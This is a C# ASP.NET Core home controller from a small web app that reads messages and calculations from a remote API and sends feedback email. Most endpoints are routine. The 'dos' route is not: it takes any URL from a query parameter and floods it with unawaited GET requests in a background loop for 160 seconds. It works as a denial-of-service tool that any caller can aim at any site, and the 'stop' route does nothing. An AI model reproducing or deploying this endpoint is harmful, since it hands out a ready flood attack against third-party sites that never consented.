using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using MyWebApp.Infrastructure;
using MyWebApp.Models;
using MyWebApp.Services;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace MyWebApp.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;
        public IBackgroundTaskQueue _queue { get; }
        private readonly IServiceScopeFactory _serviceScopeFactory;
        private readonly IEmailService emailService;
        public HomeController(ILogger<HomeController> logger, IBackgroundTaskQueue queue, IServiceScopeFactory serviceScopeFactory, IEmailService emailService)
        {
            _logger = logger;
            _queue = queue;
            _serviceScopeFactory = serviceScopeFactory;
            this.emailService = emailService;
        }

        public IActionResult Index()
        {
            ViewData["Title"] = "Hora hora";
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        public IActionResult ForMyPast()
        {
            return View();
        }

        [Route("read")]
        public async Task<IActionResult> ReadMessagePage()
        {
            List<Message> lsMessage = new List<Message>();
            HttpClient httpClient = new HttpClient();
            var apiResponse = await httpClient.GetAsync(Constants.APIUrl + "mes/mes");
            try
            {
                string response = await apiResponse.Content.ReadAsStringAsync();
                response = "{\"data\":" + response + "}";
                JObject jObResponse = JObject.Parse(response);
                lsMessage = JsonConvert.DeserializeObject<List<Message>>(jObResponse["data"].ToString());
            }
            catch (Exception ex)
            {
                lsMessage = null;
            }
            return View(lsMessage);
        }
        [Route("readnew")]
        public async Task<IActionResult> ReadNewMessagePage()
        {
            List<Message> lsMessage = new List<Message>();
            HttpClient httpClient = new HttpClient();
            var apiResponse = await httpClient.GetAsync(Constants.APIUrl + "mes/new");
            try
            {
                string response = await apiResponse.Content.ReadAsStringAsync();
                response = "{\"data\":" + response + "}";
                JObject jObResponse = JObject.Parse(response);
                lsMessage = JsonConvert.DeserializeObject<List<Message>>(jObResponse["data"].ToString());
            }
            catch (Exception ex)
            {
                lsMessage = null;
            }
            return View(lsMessage);
        }

        [Route("readcal")]
        public async Task<IActionResult> ReadCalculationPage()
        {
            List<Calculation> ls = new List<Calculation>();
            HttpClient httpClient = new HttpClient();
            var apiResponse = await httpClient.GetAsync(Constants.APIUrl + "cal/cal");
            try
            {
                string response = await apiResponse.Content.ReadAsStringAsync();
                response = "{\"data\":" + response + "}";
                JObject jObResponse = JObject.Parse(response);
                ls = JsonConvert.DeserializeObject<List<Calculation>>(jObResponse["data"].ToString());
            }
            catch (Exception ex)
            {
                ls = null;
            }
            return View(ls);
        }

        public async Task<IActionResult> CheckRead(int id)
        {
            HttpClient httpClient = new HttpClient();
            var httpContent = new StringContent(null, Encoding.UTF8, "application/json"); ;
            var apiResponse = await httpClient.PutAsync(Constants.APIUrl + "mes/" + id.ToString(), httpContent);
            return RedirectToAction("Index", "Home");
        }
        [Route("readnewcal")]
        public async Task<IActionResult> ReadNewCalculationPage()
        {
            List<Calculation> lsMessage = new List<Calculation>();
            HttpClient httpClient = new HttpClient();
            var apiResponse = await httpClient.GetAsync(Constants.APIUrl + "cal/new");
            try
            {
                string response = await apiResponse.Content.ReadAsStringAsync();
                response = "{\"data\":" + response + "}";
                JObject jObResponse = JObject.Parse(response);
                lsMessage = JsonConvert.DeserializeObject<List<Calculation>>(jObResponse["data"].ToString());
            }
            catch (Exception ex)
            {
                lsMessage = null;
            }
            return View(lsMessage);
        }
        public async Task<IActionResult> Delte(int id)
        {
            HttpClient httpClient = new HttpClient();
            var apiResponse = await httpClient.DeleteAsync(Constants.APIUrl + "mes/" + id.ToString());
            return RedirectToAction("Index", "Home");
        }

        [Route("feedback")]
        [HttpPost]
        public IActionResult SendEmail([FromBody]FeedbackRequest feedback)
        {
            try
            {
                this.emailService.Notification(feedback.Name, feedback.Email, feedback.Title, feedback.Message);
                return new OkObjectResult( new { response = "Ok" });
            }
            catch (Exception ex)
            {
                return new BadRequestObjectResult(ex);
            }
        }

        [Route("dos")]
        [HttpGet]
        public IActionResult Start([FromQuery] string link)
        {
            _queue.QueueBackgroundWorkItem(async token =>
            {
                using (var scope = _serviceScopeFactory.CreateScope())
                {

                    var scopedServices = scope.ServiceProvider;
                    HttpClient client = new HttpClient();
                    Stopwatch timer = new Stopwatch();
                    timer.Start();
                    while (timer.Elapsed.TotalSeconds < 160)
                    {
                        var response = client.GetAsync(link);
                        Console.WriteLine(response.Status);
                    }
                    //await Task.Delay(TimeSpan.FromSeconds(5), token);

                }
            });
            return Ok("In progress..");
        }
        [Route("stop")]
        [HttpGet]
        public IActionResult Stop()
        {

            return Ok("Stopped");
        }

        [Route("test")]
        [HttpGet]
        public IActionResult Test()
        {
            ViewBag.Tittle = "tit tle moi ne";
            return PartialView();
        }



        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }

    public class FeedbackRequest
    {
        public string Name { get; set; }
        public string Email { get; set; }
        public string Title { get; set; }
        public string Message { get; set; }
    }

}
